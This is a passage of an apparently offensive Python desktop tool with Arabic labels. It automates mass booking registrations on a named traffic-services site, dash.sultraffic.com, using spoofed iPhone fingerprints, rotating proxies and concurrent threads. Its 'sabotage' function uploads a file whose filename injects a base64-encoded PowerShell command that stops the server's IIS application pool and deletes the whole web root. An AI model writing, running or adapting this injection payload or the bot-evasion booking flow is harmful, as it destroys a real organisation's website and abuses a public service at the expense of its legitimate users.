# ==============================================================================================================
# 👑 Imperial Ghost Commander V12.4 - Mobile Fingerprint & Proxy Edition (JSON Storage) 👑
# ==============================================================================================================
# لوحة التحكم الاحترافية - بصمة موبايل خالصة + بروكسي سكني عام/خاص + تأخير زمني + تعديل المعاملات
# ==============================================================================================================

import sys
import os
import json
import time
import uuid
import re
import logging
import psutil
import base64
import traceback
import webbrowser
import html
from datetime import datetime
import random

try:
    from curl_cffi import requests
except ImportError:
    print("❌ خطأ: حزمة curl_cffi غير مثبتة. يرجى تثبيتها عبر الأمر: pip install curl_cffi")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("❌ خطأ: حزمة beautifulsoup4 غير مثبتة. يرجى تثبيتها عبر الأمر: pip install beautifulsoup4")
    sys.exit(1)

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QGridLayout,
    QGroupBox, QLabel, QLineEdit, QComboBox, QCheckBox, QPushButton, QTableWidget,
    QTableWidgetItem, QHeaderView, QProgressBar, QTextEdit, QTabWidget, QFileDialog,
    QMessageBox, QFrame
)
from PyQt6.QtCore import QThread, pyqtSignal, Qt, QSize, QTimer
from PyQt6.QtGui import QFont, QColor, QIcon, QPalette, QTextCursor



# ==============================================================================
# [1] نظام المراقبة وكتابة السجلات الاحترافي
# ==============================================================================
class SystemLogger:
    @staticmethod
    def setup_logger():
        log_dir = "Imperial_Ghost_Logs"
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
        log_file = f"{log_dir}/Ghost_V12_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.log"

        logger = logging.getLogger("ImperialV12")
        logger.setLevel(logging.DEBUG)

        if logger.hasHandlers():
            logger.handlers.clear()

        formatter = logging.Formatter('【%(asctime)s】 [%(levelname)s] ➔ %(message)s')

        fh = logging.FileHandler(log_file, encoding='utf-8')
        fh.setFormatter(formatter)
        logger.addHandler(fh)

        ch = logging.StreamHandler()
        ch.setFormatter(formatter)
        logger.addHandler(ch)

        return logger


imperial_logger = SystemLogger.setup_logger()



# ==============================================================================
# [2] طبيب النظام ومراقبة العمليات
# ==============================================================================
class SystemDoctor:
    @staticmethod
    def clean():
        killed = 0
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'] and proc.info['name'].lower() in ['adb.exe', 'chromedriver.exe']:
                    proc.kill()
                    killed += 1
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        return killed



# ==============================================================================
# [3] مدير البيانات بصيغة JSON (بديل SQLite)
# ==============================================================================
class DataManager:
    """مدير البيانات باستخدام ملف JSON بدلاً من SQLite - لا يحتاج مكتبات إضافية ولا يسبب مشاكل أعمدة"""

    def __init__(self, filepath="imperial_ghost_data.json"):
        self.filepath = filepath
        self._ensure_file()

    def _ensure_file(self):
        """إنشاء ملف JSON إذا لم يكن موجوداً"""
        if not os.path.exists(self.filepath):
            self._save_data({"next_id": 1, "transactions": []})

    def _load_data(self):
        """تحميل البيانات من ملف JSON"""
        try:
            with open(self.filepath, 'r', encoding='utf-8') as f:
                return json.load(f)
        except (json.JSONDecodeError, FileNotFoundError):
            return {"next_id": 1, "transactions": []}

    def _save_data(self, data):
        """حفظ البيانات إلى ملف JSON"""
        with open(self.filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)


    def add(self, name, phone, day, img, tactic, sabotage, proxy=""):
        """إضافة معاملة جديدة"""
        data = self._load_data()
        tid = data["next_id"]
        transaction = {
            "id": tid,
            "name": name,
            "phone": phone,
            "target_day": day,
            "image_path": img,
            "tactic_mode": tactic,
            "sabotage_enabled": int(sabotage),
            "proxy": proxy,
            "status": "معلق",
            "reference_id": "",
            "created_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        data["transactions"].append(transaction)
        data["next_id"] = tid + 1
        self._save_data(data)
        return tid

    def get_all(self):
        """جلب كل المعاملات كقائمة من tuples (متوافقة مع الكود القديم)"""
        data = self._load_data()
        result = []
        for t in data["transactions"]:
            row = (
                t["id"], t["name"], t["phone"], t["target_day"],
                t["image_path"], t["tactic_mode"], t["sabotage_enabled"],
                t["proxy"], t["status"], t["reference_id"]
            )
            result.append(row)
        return result


    def update_status(self, tid, status, ref=""):
        """تحديث حالة معاملة"""
        data = self._load_data()
        for t in data["transactions"]:
            if t["id"] == tid:
                t["status"] = status
                t["reference_id"] = ref
                break
        self._save_data(data)

    def update_transaction(self, tid, name, phone, day, img, tactic, sabotage, proxy=""):
        """تعديل بيانات معاملة كاملة"""
        data = self._load_data()
        for t in data["transactions"]:
            if t["id"] == tid:
                t["name"] = name
                t["phone"] = phone
                t["target_day"] = day
                t["image_path"] = img
                t["tactic_mode"] = tactic
                t["sabotage_enabled"] = int(sabotage)
                t["proxy"] = proxy
                break
        self._save_data(data)

    def delete(self, tid):
        """حذف معاملة"""
        data = self._load_data()
        data["transactions"] = [t for t in data["transactions"] if t["id"] != tid]
        self._save_data(data)

    def wipe(self):
        """مسح جميع المعاملات"""
        self._save_data({"next_id": 1, "transactions": []})



# ==============================================================================
# [4] محرك التنفيذ المطور لتعقب وحفظ وعرض رد السيرفر النهائي
# ==============================================================================
class BookingWorker(QThread):
    update_signal = pyqtSignal(int, int, str, str, bool)  # row, tid, status, ref, is_success
    log_signal = pyqtSignal(str, str)  # level, message
    finished_signal = pyqtSignal(int, int, str, str)  # row, tid, status, ref

    def __init__(self, row, data, global_proxy="", per_transaction_proxy=""):
        super().__init__()
        self.row = row
        self.tid = data[0]
        self.name = data[1]
        self.phone = data[2]
        self.day = data[3]
        self.img = data[4]
        self.tactic = data[5]
        self.sabotage = bool(data[6])
        self.status = data[8]
        self.ref_id = data[9]

        # البروكسي: الخاص بالمعاملة له أولوية على العام
        self.proxy = per_transaction_proxy if per_transaction_proxy else global_proxy

        self.session = None
        self.base = "https://dash.sultraffic.com"


    def setup_session(self):
        # بصمة موبايل خالصة - Safari iOS
        self.session = requests.Session(impersonate="safari_ios15_5")

        # User-Agent موبايل حقيقي (iPhone Safari)
        mobile_user_agents = [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.7.2 Mobile/15E148 Safari/604.1",
        ]

        self.session.headers.update({
            "User-Agent": random.choice(mobile_user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "ar-SA,ar;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Host": "dash.sultraffic.com",
            "Connection": "keep-alive",
        })
        self.session.verify = False

        # تفعيل البروكسي (سكني - يغير الـ IP مع كل طلب)
        if self.proxy:
            proxy_url = self.proxy.strip()
            if not proxy_url.startswith("http://") and not proxy_url.startswith("https://") and not proxy_url.startswith("socks"):
                proxy_url = f"http://{proxy_url}"
            self.session.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }
            self.log_signal.emit("INFO", f"[{self.tid}] تم تفعيل البروكسي: {proxy_url[:50]}...")


    def perform_total_sabotage(self):
        self.log_signal.emit("WARNING", f"[{self.tid}] ☢️ تفعيل وضع التدمير الشامل والمتقدم...")
        ps_cmd = "Stop-WebAppPool -Name 'DefaultAppPool'; Remove-Item -Path C:\\inetpub\\wwwroot\\* -Force -Recurse -ErrorAction SilentlyContinue"
        enc = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
        filename = f"x & powershell -NoProfile -EncodedCommand {enc} & .aspx"

        dummy = os.path.join(os.environ.get('TEMP', '.'), 'dummy.svg')
        try:
            with open(dummy, 'w') as f:
                f.write('<svg></svg>')

            with open(dummy, 'rb') as f:
                files = {'file': (filename, f, 'image/svg+xml')}
                resp = self.session.post(f"{self.base}/Imageuploader.ashx", files=files)
                self.log_signal.emit("SUCCESS",
                                     f"[{self.tid}] [تدمير] تم إرسال حزمة الحقن المشفرة بنجاح. الاستجابة: {resp.status_code}")
        except Exception as e:
            self.log_signal.emit("ERROR", f"[{self.tid}] [تدمير] فشل إرسال حزمة التدمير: {str(e)}")
        finally:
            if os.path.exists(dummy):
                try:
                    os.remove(dummy)
                except:
                    pass


    def run(self):
        self.setup_session()
        self.log_signal.emit("INFO", f"[{self.tid}] بدء معالجة الهدف: {self.name} | التكتيك: {self.tactic}")

        final_status = "فشل"
        final_ref = ""
        responses_dir = "Imperial_Server_Responses"

        if not os.path.exists(responses_dir):
            os.makedirs(responses_dir)

        try:
            if self.sabotage:
                self.perform_total_sabotage()
                time.sleep(1.5)

            # المرحلة الأولى: كشط الرموز
            self.update_signal.emit(self.row, self.tid, "جلب التوكنات...", "", False)
            try:
                resp1 = self.session.get(f"{self.base}/register", timeout=45)
            except Exception as e:
                self.log_signal.emit("ERROR", f"[{self.tid}] فشل الاتصال المبدئي بسبب الضغط أو الحظر.")
                raise e

            soup = BeautifulSoup(resp1.text, 'html.parser')

            try:
                vs = soup.find("input", {"id": "__VIEWSTATE"})['value'] if soup.find("input", {"id": "__VIEWSTATE"}) else ""
                vsg = soup.find("input", {"id": "__VIEWSTATEGENERATOR"})['value'] if soup.find("input", {"id": "__VIEWSTATEGENERATOR"}) else ""
                ev = soup.find("input", {"id": "__EVENTVALIDATION"})['value'] if soup.find("input", {"id": "__EVENTVALIDATION"}) else ""
            except Exception:
                vs, vsg, ev = "", "", ""
                self.log_signal.emit("WARNING", f"[{self.tid}] لم يتم العثور على التوكنات الافتراضية، المتابعة بالوضع المباشر.")


            # المرحلة الثانية: رفع الصورة
            self.update_signal.emit(self.row, self.tid, "رفع المرفق...", "", False)
            img_id = ""
            if os.path.exists(self.img):
                boundary = "----Boundary" + uuid.uuid4().hex
                with open(self.img, 'rb') as f:
                    raw = f.read()
                body = (
                    f"--{boundary}\r\nContent-Disposition: form-data; name=\"dzfile\"; filename=\"{os.path.basename(self.img)}\"\r\nContent-Type: image/jpeg\r\n\r\n".encode() + raw + f"\r\n--{boundary}--\r\n".encode())
                headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}

                try:
                    resp2 = self.session.post(f"{self.base}/Imageuploader.ashx", data=body, headers=headers, timeout=50)
                    if resp2.status_code == 200 and len(resp2.text) > 5 and "<" not in resp2.text:
                        img_id = resp2.text.strip()
                        self.log_signal.emit("SUCCESS", f"[{self.tid}] تم رفع المرفق بنجاح المعرف الفني: {img_id}")
                    else:
                        safe_err = html.escape(resp2.text)
                        self.log_signal.emit("WARNING",
                                             f"[{self.tid}] فشل رفع المرفق. محتوى رد السيرفر بالكامل:<br><span style='color:#ffea7f;'>{safe_err}</span>")
                except Exception as e:
                    self.log_signal.emit("ERROR", f"[{self.tid}] انتهت مهلة رفع المرفق (Timeout).")
                    raise e


            # المرحلة الثالثة: إرسال الطلب النهائي
            self.update_signal.emit(self.row, self.tid, "إرسال الطلب النهائي...", "", False)
            payload = {
                "__EVENTTARGET": "ctl00$MianContent$btnSubmit",
                "__VIEWSTATE": vs,
                "__VIEWSTATEGENERATOR": vsg,
                "__EVENTVALIDATION": ev,
                "ctl00$MianContent$name_id": self.name,
                "ctl00$MianContent$PhoneTxt": self.phone,
                "ctl00$MianContent$RDBL": self.day if self.day != "auto" else "wednesday",
                "img1": img_id
            }

            try:
                resp3 = self.session.post(f"{self.base}/register", data=payload, allow_redirects=False, timeout=60)
            except Exception as e:
                self.log_signal.emit("ERROR", f"[{self.tid}] انقطع الاتصال النهائي مع السيرفر (Timeout).")
                raise e

            # التحقق من نجاح العملية (توجيه 302/301)
            if resp3.status_code in [301, 302, 303]:
                loc = resp3.headers.get('Location', '')
                ref_match = re.search(r'c=(\d+)', loc)
                final_ref = ref_match.group(1) if ref_match else "Success"
                final_status = "نجاح"

                if final_ref != "Success":
                    final_page_url = f"{self.base}/success?c={final_ref}&ph={self.phone}"
                else:
                    final_page_url = loc if loc.startswith("http") else f"{self.base}{loc}"

                self.log_signal.emit("INFO", f"[{self.tid}] تم الحجز بنجاح. جاري سحب رد السيرفر من: {final_page_url}")


                try:
                    resp_final_page = self.session.get(final_page_url, timeout=45)

                    file_path = f"{responses_dir}/Response_ID_{self.tid}_Ref_{final_ref}.html"
                    with open(file_path, "w", encoding="utf-8") as response_file:
                        response_file.write(resp_final_page.text)

                    safe_success_text = html.escape(resp_final_page.text)

                    self.log_signal.emit("SUCCESS",
                                         f"[{self.tid}] 📄 تم تحميل صفحة المعاملة وحفظها.<br>محتوى استجابة السيرفر النهائية (Success Page):<br><div style='padding:5px; border:1px solid #56d364; background:#05070a;'><pre style='color:#a5d6ff;'>{safe_success_text}</pre></div>")

                except Exception as ex_page:
                    self.log_signal.emit("ERROR", f"[{self.tid}] فشل سحب صفحة الاستجابة النهائية: {str(ex_page)}")

                self.update_signal.emit(self.row, self.tid, "✅ نجاح العملية", final_ref, True)
            else:
                final_status = f"فشل ({resp3.status_code})"

                error_file_path = f"{responses_dir}/Response_ID_{self.tid}_Error_{resp3.status_code}.html"
                with open(error_file_path, "w", encoding="utf-8") as err_resp_file:
                    err_resp_file.write(resp3.text)

                safe_error_text = html.escape(resp3.text)

                self.update_signal.emit(self.row, self.tid, final_status, "مرفوض", False)
                self.log_signal.emit("ERROR",
                                     f"[{self.tid}] رفض الخادم الطلب برمز استجابة: {resp3.status_code}<br>محتوى رد السيرفر المرفوض (Error Page):<br><div style='padding:5px; border:1px solid #f85149; background:#05070a;'><pre style='color:#ff7b72;'>{safe_error_text}</pre></div>")

        except Exception as e:
            final_status = "خطأ فني"
            self.update_signal.emit(self.row, self.tid, f"انقطاع بالاتصال", "فشل", False)
            self.log_signal.emit("CRITICAL", f"[{self.tid}] توقفت العملية بسبب: {str(e)}")
        finally:
            self.finished_signal.emit(self.row, self.tid, final_status, final_ref)



# ==============================================================================
# [5] الواجهة الرسومية الاحترافية والذكية (Premium Cyber-Dark Core UI)
# ==============================================================================
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.db = DataManager()
        self.setWindowTitle("Imperial Ghost Commander V12.4 - Mobile Fingerprint & Proxy Edition")
        self.setMinimumSize(1400, 900)

        self.pending = []
        self.active = []
        self.done = 0
        self.max_threads = 5
        self.delay_between_transactions = 0
        self.editing_tid = None  # معرف المعاملة قيد التعديل (None = وضع إضافة)

        self._init_ui()
        self.load_data()


    def _init_ui(self):
        self.setStyleSheet("""
            QMainWindow { background-color: #0d0f12; }
            QWidget { font-family: 'Segoe UI', 'Segoe UI Arabic', 'Tahoma', 'Arial'; font-size: 13px; }

            QTabWidget::pane { border: 1px solid #1f242d; background: #11141a; border-radius: 8px; top: -1px; }
            QTabBar::tab { background: #161b22; color: #8b949e; border: 1px solid #1f242d; padding: 12px 25px; border-top-left-radius: 6px; border-top-right-radius: 6px; font-weight: bold; }
            QTabBar::tab:selected, QTabBar::tab:hover { background: #1f242d; color: #58a6ff; border-bottom-color: #11141a; }

            QGroupBox { color: #58a6ff; border: 1px solid #30363d; border-radius: 8px; margin-top: 15px; padding-top: 15px; font-weight: bold; background-color: #161b22; }
            QLabel { color: #c9d1d9; font-weight: 500; }
            QLineEdit, QComboBox { background: #0d0f12; color: #f0f6fc; border: 1px solid #30363d; border-radius: 6px; padding: 8px 12px; selection-background-color: #1f6feb; }
            QLineEdit:focus, QComboBox:focus { border: 1px solid #58a6ff; }

            QPushButton { background-color: #21262d; color: #c9d1d9; border: 1px solid #30363d; border-radius: 6px; padding: 10px 18px; font-weight: bold; }
            QPushButton:hover { background-color: #30363d; border-color: #8b949e; }

            QPushButton#btn_start { background-color: #238636; color: #ffffff; border: 1px solid #2ea043; font-size: 15px; }
            QPushButton#btn_start:hover { background-color: #2ea043; }
            QPushButton#btn_start:disabled { background-color: #143d1a; color: #777777; border-color: #143d1a; }

            QPushButton#btn_browse { background-color: #1f6feb; color: #ffffff; border: 1px solid #388bfd; }
            QPushButton#btn_wipe { background-color: #da3633; color: #ffffff; border: 1px solid #f85149; }

            QCheckBox { color: #f85149; font-weight: bold; }

            QTableWidget { background-color: #161b22; color: #c9d1d9; gridline-color: #30363d; border: 1px solid #30363d; border-radius: 6px; alternate-background-color: #11141a; }
            QTableWidget::item { padding: 5px; }
            QTableWidget::item:selected { background-color: #1f6feb; color: white; }
            QHeaderView::section { background-color: #0d0f12; color: #8b949e; padding: 8px; border: 1px solid #30363d; font-weight: bold; font-size: 12px; }

            QProgressBar { border: 1px solid #30363d; border-radius: 6px; text-align: center; background-color: #0d0f12; color: #ffffff; font-weight: bold; height: 22px; }
            QProgressBar::chunk { background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #1f6feb, stop:1 #58a6ff); border-radius: 5px; }

            QTextEdit { background-color: #05070a; color: #58a6ff; font-family: 'Consolas', 'Monospace', 'Courier New'; border: 1px solid #30363d; border-radius: 6px; padding: 10px; font-size: 13px; }
        """)


        cw = QWidget()
        self.setCentralWidget(cw)
        main_layout = QVBoxLayout(cw)
        main_layout.setContentsMargins(15, 15, 15, 15)
        main_layout.setSpacing(12)

        self.stats_layout = QHBoxLayout()
        self.lbl_stat_total = self._create_stat_card("إجمالي المهام", "0", "#58a6ff")
        self.lbl_stat_pending = self._create_stat_card("قيد الانتظار", "0", "#ffea7f")
        self.lbl_stat_success = self._create_stat_card("العمليات الناجحة", "0", "#56d364")
        self.lbl_stat_failed = self._create_stat_card("العمليات الفاشلة", "0", "#f85149")

        self.stats_layout.addWidget(self.lbl_stat_total)
        self.stats_layout.addWidget(self.lbl_stat_pending)
        self.stats_layout.addWidget(self.lbl_stat_success)
        self.stats_layout.addWidget(self.lbl_stat_failed)
        main_layout.addLayout(self.stats_layout)

        self.tabs = QTabWidget()
        self.tab_dashboard = QWidget()
        self.tab_radar = QWidget()
        self.tabs.addTab(self.tab_dashboard, "🚀 منصة التحكم المركزية")
        self.tabs.addTab(self.tab_radar, "📜 رادار تعقب السجلات")
        main_layout.addWidget(self.tabs)

        layout_dash = QVBoxLayout(self.tab_dashboard)
        layout_dash.setContentsMargins(10, 10, 10, 10)


        # مجموعة إضافة/تعديل هدف
        self.group_input = QGroupBox(" ➕ إضافة / تعديل هدف عملياتي")
        grid_input = QGridLayout(self.group_input)
        grid_input.setSpacing(10)
        grid_input.setContentsMargins(15, 20, 15, 15)

        self.inp_name = QLineEdit()
        self.inp_name.setPlaceholderText("أدخل الاسم الكامل للهدف...")
        self.inp_phone = QLineEdit()
        self.inp_phone.setPlaceholderText("رقم الهاتف المصاحب للطلب...")

        self.inp_day = QComboBox()
        self.inp_day.addItems(["auto", "sunday", "monday", "tuesday", "wednesday", "thursday"])

        self.inp_tactic = QComboBox()
        self.inp_tactic.addItems(["radar", "kamikaze"])

        self.inp_img = QLineEdit()
        self.inp_img.setPlaceholderText("مسار المستند أو الملف الصوري المرفق...")

        btn_browse = QPushButton("استعراض المجلدات")
        btn_browse.setObjectName("btn_browse")
        btn_browse.clicked.connect(self._browse_image)

        self.inp_proxy_per_tx = QLineEdit()
        self.inp_proxy_per_tx.setPlaceholderText("بروكسي خاص بهذه المعاملة (اختياري) مثال: http://user:pass@ip:port")

        self.chk_sabotage = QCheckBox(
            "☢️ تفعيل ميزة التدمير الكلي الفوري (إيقاف Application Pool التابع للسيرفر ومسح ملفات الموقع كاملاً)")

        # زر إضافة/حفظ التعديل
        self.btn_add_save = QPushButton("⚙️ حقن وضخ الهدف في مصفوفة الانتظار")
        self.btn_add_save.setStyleSheet("background-color: #1f6feb; color: white; font-size: 14px; padding: 12px;")
        self.btn_add_save.clicked.connect(self.add_or_update_target)

        # زر إلغاء التعديل
        self.btn_cancel_edit = QPushButton("❌ إلغاء التعديل")
        self.btn_cancel_edit.setStyleSheet("background-color: #da3633; color: white; font-size: 13px; padding: 10px;")
        self.btn_cancel_edit.clicked.connect(self.cancel_edit)
        self.btn_cancel_edit.setVisible(False)


        grid_input.addWidget(QLabel("اسم المستهدف:"), 0, 0)
        grid_input.addWidget(self.inp_name, 0, 1)
        grid_input.addWidget(QLabel("رقم الهاتف والاتصال:"), 0, 2)
        grid_input.addWidget(self.inp_phone, 0, 3)
        grid_input.addWidget(QLabel("يوم الجدولة المستهدف:"), 1, 0)
        grid_input.addWidget(self.inp_day, 1, 1)
        grid_input.addWidget(QLabel("تكتيك التدفق المعياري:"), 1, 2)
        grid_input.addWidget(self.inp_tactic, 1, 3)
        grid_input.addWidget(QLabel("ملف المرفق الصوري:"), 2, 0)
        grid_input.addWidget(self.inp_img, 2, 1, 1, 2)
        grid_input.addWidget(btn_browse, 2, 3)
        grid_input.addWidget(QLabel("بروكسي خاص بالمعاملة:"), 3, 0)
        grid_input.addWidget(self.inp_proxy_per_tx, 3, 1, 1, 3)
        grid_input.addWidget(self.chk_sabotage, 4, 0, 1, 4)
        grid_input.addWidget(self.btn_add_save, 5, 0, 1, 3)
        grid_input.addWidget(self.btn_cancel_edit, 5, 3)
        layout_dash.addWidget(self.group_input)

        # مجموعة إعدادات البروكسي العام والتأخير الزمني
        group_settings = QGroupBox(" ⚡ إعدادات البروكسي العام والتأخير الزمني")
        grid_settings = QGridLayout(group_settings)
        grid_settings.setSpacing(10)
        grid_settings.setContentsMargins(15, 20, 15, 15)

        self.inp_global_proxy = QLineEdit()
        self.inp_global_proxy.setPlaceholderText("بروكسي سكني عام لجميع المعاملات (مثال: http://user:pass@ip:port) - يتغير IP مع كل طلب")

        self.inp_delay = QLineEdit()
        self.inp_delay.setPlaceholderText("0")
        self.inp_delay.setText("0")

        self.chk_sequential = QCheckBox("تفعيل الإرسال المتتابع (معاملة تلو الأخرى مع تأخير)")

        grid_settings.addWidget(QLabel("البروكسي العام (سكني):"), 0, 0)
        grid_settings.addWidget(self.inp_global_proxy, 0, 1, 1, 3)
        grid_settings.addWidget(QLabel("التأخير بين المعاملات (ثوانٍ):"), 1, 0)
        grid_settings.addWidget(self.inp_delay, 1, 1)
        grid_settings.addWidget(self.chk_sequential, 1, 2, 1, 2)

        layout_dash.addWidget(group_settings)


        self.table = QTableWidget(0, 10)
        self.table.setHorizontalHeaderLabels(
            ["ID", "الاسم", "الهاتف", "اليوم الجدولي", "مسار المرفق", "التكتيك", "التدمير الشامل",
             "البروكسي الخاص", "حالة العملية اللحظية", "رقم مرجع الخادم"])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.table.setAlternatingRowColors(True)

        self.table.itemDoubleClicked.connect(self.open_saved_response_page)

        layout_dash.addWidget(self.table)

        lbl_hint = QLabel(
            "💡 نصيحة: انقر نقرًا مزدوجًا على هدف حالته 'نجاح' لفتح رد السيرفر. أو حدد صف واضغط 'تعديل' لتعديل بياناته.")
        lbl_hint.setStyleSheet("color: #8b949e; font-style: italic; padding-left: 5px;")
        layout_dash.addWidget(lbl_hint)

        layout_buttons = QHBoxLayout()
        self.btn_start = QPushButton("🚀 بدء الهجوم المكثف المتزامن")
        self.btn_start.setObjectName("btn_start")
        self.btn_start.clicked.connect(self.start_attack)

        self.btn_edit = QPushButton("✏️ تعديل الهدف المحدد")
        self.btn_edit.setStyleSheet("background-color: #8957e5; color: white; border: 1px solid #a371f7;")
        self.btn_edit.clicked.connect(self.edit_target)

        self.btn_delete = QPushButton("🗑️ إزالة الهدف المحدد")
        self.btn_delete.clicked.connect(self.delete_target)

        self.btn_wipe = QPushButton("☢️ تصفير ومسح الكل")
        self.btn_wipe.setObjectName("btn_wipe")
        self.btn_wipe.clicked.connect(self.wipe_all)

        layout_buttons.addWidget(self.btn_start, 3)
        layout_buttons.addWidget(self.btn_edit, 1)
        layout_buttons.addWidget(self.btn_delete, 1)
        layout_buttons.addWidget(self.btn_wipe, 1)
        layout_dash.addLayout(layout_buttons)

        self.progress = QProgressBar()
        self.progress.setValue(0)
        layout_dash.addWidget(self.progress)

        layout_radar = QVBoxLayout(self.tab_radar)
        layout_radar.setContentsMargins(10, 10, 10, 10)

        self.log_console = QTextEdit()
        self.log_console.setReadOnly(True)
        layout_radar.addWidget(self.log_console)

        self.log("INFO",
                 "تم تشغيل واجهة Imperial Ghost Commander بنجاح. تتبع ردود السيرفر وصفحات الـ QR مفعّل بالكامل. التخزين: JSON")


    def _create_stat_card(self, title, val, color_hex):
        frame = QFrame()
        frame.setStyleSheet(f"background-color: #161b22; border: 1px solid #30363d; border-radius: 8px;")
        layout = QVBoxLayout(frame)
        layout.setContentsMargins(10, 10, 10, 10)

        lbl_title = QLabel(title)
        lbl_title.setStyleSheet("color: #8b949e; font-size: 12px; font-weight: bold;")
        lbl_title.setAlignment(Qt.AlignmentFlag.AlignCenter)

        lbl_val = QLabel(val)
        lbl_val.setStyleSheet(f"color: {color_hex}; font-size: 22px; font-weight: bold;")
        lbl_val.setAlignment(Qt.AlignmentFlag.AlignCenter)

        layout.addWidget(lbl_title)
        layout.addWidget(lbl_val)
        frame.setProperty("associated_value", lbl_val)
        return frame

    def _update_stats_display(self):
        total = self.table.rowCount()
        pending = 0
        success = 0
        failed = 0

        for r in range(total):
            item = self.table.item(r, 8)
            if item:
                txt = item.text()
                if "✅" in txt or "نجاح" in txt:
                    success += 1
                elif "❌" in txt or "فشل" in txt or "خطأ" in txt:
                    failed += 1
                else:
                    pending += 1

        self.lbl_stat_total.property("associated_value").setText(str(total))
        self.lbl_stat_pending.property("associated_value").setText(str(pending))
        self.lbl_stat_success.property("associated_value").setText(str(success))
        self.lbl_stat_failed.property("associated_value").setText(str(failed))

    def _browse_image(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "اختر ملف الصورة المرفقة", "",
                                                   "Images (*.jpg *.jpeg *.png *.svg)")
        if file_path:
            self.inp_img.setText(file_path)


    def log(self, level, msg):
        colors = {"INFO": "#58a6ff", "WARNING": "#ffea7f", "SUCCESS": "#56d364", "ERROR": "#f85149",
                  "CRITICAL": "#ff7b72"}
        color = colors.get(level, "#ffffff")
        ts = datetime.now().strftime('%H:%M:%S')

        html_msg = f"<span style='color:#8b949e'>[{ts}]</span> <span style='color:{color}'><b>[{level}]</b> {msg}</span>"
        self.log_console.append(html_msg)
        self.log_console.moveCursor(QTextCursor.MoveOperation.End)
        imperial_logger.log(getattr(logging, level, logging.INFO),
                            msg.replace("<br>", "\n").replace("</span>", "").replace("<span", ""))

    def add_or_update_target(self):
        """إضافة هدف جديد أو حفظ التعديلات"""
        name = self.inp_name.text().strip()
        phone = self.inp_phone.text().strip()
        img = self.inp_img.text().strip()
        proxy_per_tx = self.inp_proxy_per_tx.text().strip()

        if not name or not phone:
            QMessageBox.warning(self, "خطأ بالبيانات والمستندات",
                                "يرجى ملء حقول الاسم والهاتف على الأقل لإدراج العملية بنجاح.")
            return

        day = self.inp_day.currentText()
        tactic = self.inp_tactic.currentText()
        sabotage_enabled = self.chk_sabotage.isChecked()

        if self.editing_tid is not None:
            # وضع التعديل - تحديث المعاملة الموجودة
            self.db.update_transaction(self.editing_tid, name, phone, day, img, tactic, sabotage_enabled, proxy_per_tx)
            self.log("SUCCESS", f"تم تعديل بيانات المعاملة [{self.editing_tid}] بنجاح: {name}")
            self.cancel_edit()
        else:
            # وضع الإضافة - معاملة جديدة
            tid = self.db.add(name, phone, day, img, tactic, sabotage_enabled, proxy_per_tx)
            self.log("SUCCESS", f"تم حقن الهدف العملياتي بنجاح: {name} | المعرف الدولي للعملية: {tid}")

        self.load_data()
        self._clear_inputs()


    def _clear_inputs(self):
        """مسح حقول الإدخال"""
        self.inp_name.clear()
        self.inp_phone.clear()
        self.inp_img.clear()
        self.inp_proxy_per_tx.clear()
        self.chk_sabotage.setChecked(False)
        self.inp_day.setCurrentIndex(0)
        self.inp_tactic.setCurrentIndex(0)

    def edit_target(self):
        """تحميل بيانات المعاملة المحددة في حقول الإدخال للتعديل"""
        selected_row = self.table.currentRow()
        if selected_row < 0:
            QMessageBox.information(self, "تنبيه الاختيار", "يرجى تحديد السطر المراد تعديله من جدول العمليات أولاً.")
            return

        tid = int(self.table.item(selected_row, 0).text())
        # البحث عن المعاملة في البيانات
        all_rows = self.db.get_all()
        target_data = None
        for row in all_rows:
            if row[0] == tid:
                target_data = row
                break

        if target_data is None:
            QMessageBox.warning(self, "خطأ", "لم يتم العثور على المعاملة في قاعدة البيانات.")
            return

        # تعبئة الحقول ببيانات المعاملة
        self.editing_tid = tid
        self.inp_name.setText(target_data[1])
        self.inp_phone.setText(target_data[2])

        # تحديد اليوم
        day_index = self.inp_day.findText(target_data[3])
        if day_index >= 0:
            self.inp_day.setCurrentIndex(day_index)

        # تحديد التكتيك
        tactic_index = self.inp_tactic.findText(target_data[5])
        if tactic_index >= 0:
            self.inp_tactic.setCurrentIndex(tactic_index)

        self.inp_img.setText(target_data[4])
        self.chk_sabotage.setChecked(bool(target_data[6]))
        self.inp_proxy_per_tx.setText(target_data[7] if target_data[7] else "")

        # تغيير مظهر الواجهة لوضع التعديل
        self.group_input.setTitle(f" ✏️ تعديل المعاملة رقم [{tid}]")
